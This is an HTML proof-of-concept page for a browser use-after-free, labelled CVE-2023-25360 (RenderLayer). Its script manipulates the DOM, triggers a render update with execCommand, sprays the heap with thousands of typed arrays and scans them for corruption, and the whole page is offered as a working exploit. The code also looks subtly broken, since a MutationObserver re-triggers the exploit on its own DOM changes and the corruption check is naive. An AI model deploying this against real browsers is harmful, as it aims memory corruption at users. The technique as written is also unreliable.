<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2023-25360 PoC</title>
    <style>
        #target {
            position: absolute;
            width: 200px;
            height: 200px;
            overflow: auto;
            background: green;
        }
        button {
            margin: 20px 0;
            padding: 12px;
            font-size: 18px;
            cursor: pointer;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
            color: navy;
        }
    </style>
</head>
<body>
    <h1>CVE-2023-25360: RenderLayer UAF</h1>
    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
    <button id="trigger">Trigger PoC</button>
    <div id="status">Idle...</div>
    <div id="parent">
        <div id="target"></div>
    </div>
    <script>
        const parent = document.getElementById('parent');
        const target = document.getElementById('target');
        const status = document.getElementById('status');
        let attempts = 0;

        function sprayHeap() {
            const arrays = [];
            for (let i = 0; i < 15000; i++) {
                const buf = new Uint8Array(4096);
                buf.fill(0x42); // Fill with 'B'
                arrays.push(buf);
            }
            return arrays;
        }

        function triggerExploit() {
            attempts++;
            console.log(`Attempt ${attempts}: Starting...`);
            status.textContent = `Attempt ${attempts} running...`;

            // Step 1: Manipulate DOM to free RenderLayer
            target.style.display = 'block';
            parent.removeChild(target);

            // Step 2: Trigger style and render tree update
            setTimeout(() => {
                try {
                    // Re-add element to force style recalc
                    parent.appendChild(target);
                    // execCommand to trigger render tree update
                    document.execCommand('fontSize', false, '5');
                    // Spray heap
                    const arrays = sprayHeap();
                    // Check for UAF
                    console.log('Scanning for UAF...');
                    for (let i = 0; i < arrays.length; i++) {
                        if (arrays[i][0] !== 0x42) {
                            console.log(`UAF found at index ${i}`);
                            status.textContent = 'UAF detected!';
                            return;
                        }
                    }
                    console.log('Exploit attempt completed, check for crash.');
                    status.textContent = 'Exploit attempted!';
                } catch (err) {
                    console.error(`Error: ${err.message}`);
                    status.textContent = 'Failed: Error occurred.';
                }
            }, 50);
        }

        const observer = new MutationObserver(() => {
            console.log('DOM changed, retrying exploit...');
            triggerExploit();
        });

        observer.observe(parent, { childList: true, subtree: true });

        document.getElementById('trigger').addEventListener('click', () => {
            try {
                triggerExploit();
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = 'Failed: Error occurred.';
            }
        });
    </script>
</body>
</html>
